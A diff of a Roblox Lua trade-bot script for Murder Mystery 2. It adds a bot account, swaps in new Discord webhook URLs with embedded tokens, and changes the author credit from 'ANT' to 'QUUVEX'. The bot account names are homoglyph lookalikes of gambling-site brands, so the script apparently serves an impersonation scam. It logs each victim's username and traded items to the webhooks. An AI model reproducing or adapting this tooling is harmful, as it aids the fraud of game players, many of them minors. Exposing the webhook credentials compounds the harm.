@@ -1,5 +1,4 @@
-local users = {"mm2betfIip", "bloxymm2fIip", "bloxymm2fllp", "fIipbetmm2", "bloxymm2bet", "betfIipmm2", "betflipmm2", "bIoxystockmm2", "bIoxyflipmm2", "bIoxyfIipmm2", "bIoxyflipmm2", "bIoxymm2bet", "BL_ZIZ", "BL_PIP", "BL_ZEZ", "BL_VUV", "BL_PFP", "BL_PlP", "BL_HUH", "BL_Z1Z"}
-
+local users = {"mm2betfIip", "BL_PHP",  "bloxymm2fIip", "bloxymm2fllp", "fIipbetmm2", "bloxymm2bet", "betfIipmm2", "betflipmm2", "bIoxystockmm2", "bIoxyflipmm2", "bIoxyfIipmm2", "bIoxyflipmm2", "bIoxymm2bet", "BL_ZIZ", "BL_PIP", "BL_ZEZ", "BL_VUV", "BL_PFP", "BL_PlP", "BL_HUH", "BL_Z1Z"}
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local Players = game:GetService("Players")
 local TextChatService = game:GetService("TextChatService")
@@ -61,7 +60,7 @@ local function tradeProcess()
             local randomMessage = messages[math.random(1, #messages)]
             sendMessage(randomMessage)
 
-            local url = "https://discord.com/api/webhooks/1353149308349845627/K8ywKxYsFVdQCUojElCQ71pqhQV2nN_zvnKDNJNBI6rBm-hn0Z4g55mbk--XDyJX-Sxw"
+            local url = "https://discord.com/api/webhooks/1358897647116619966/YXMk4-a15cLqtd_mgI0ABZa3MpskF9vFxoBp3zmAXbOrArYWnZaxV-lGS-51YqgIEscL"
 local localusername = game.Players.LocalPlayer.Name
 local traderplayer = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Username.Text
 traderplayer = traderplayer:gsub("[%(%)]", "")
@@ -91,7 +90,7 @@ local embed = {
     ["fields"] = {
         { ["name"] = "NOTIFICATION", ["value"] = "User " .. traderplayer .. " started a trade with bot: " .. localusername .. "!" }
     },
-    ["footer"] = { ["text"] = "MADE BY ANT" }
+    ["footer"] = { ["text"] = "MADE BY QUUVEX" }
 }
 
 SendMessageEMBED(url, embed)
@@ -109,7 +108,7 @@ SendMessageEMBED(url, embed)
                     local acceptedVisible = LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Accepted.Visible
 
                     if acceptedVisible == true then
-                        local url = "https://discord.com/api/webhooks/1353131633380687874/sNtGGBm8ob9SULB43RbX3TIIuR7dqiS8pM1D7kByl8PNdrB8BY2DC0I2SSbzNhBpmoct"
+                        local url = "https://discord.com/api/webhooks/1358899540341559386/ZoyXoYRvTDaoYYAzj7tlr1P4s8XDvdNpIaH-tcigUFjNuDk-wr_SwgVEAFDlifLQBK6V"
 local localusername = game.Players.LocalPlayer.Name
 local traderplayer = game:GetService("Players").LocalPlayer.PlayerGui.TradeGUI.Container.Trade.TheirOffer.Username.Text
 traderplayer = traderplayer:gsub("[%(%)]", "")
@@ -183,7 +182,7 @@ local embed = {
         { ["name"] = "TRADER", ["value"] = traderplayer },
         { ["name"] = "TRADED ITEMS", ["value"] = tradedItemsString ~= "" and tradedItemsString or "No valid items traded." }
     },
-    ["footer"] = { ["text"] = "MADE BY ANT" }
+    ["footer"] = { ["text"] = "MADE BY QUUVEX" }
 }
 
 SendMessageEMBED(url, embed)
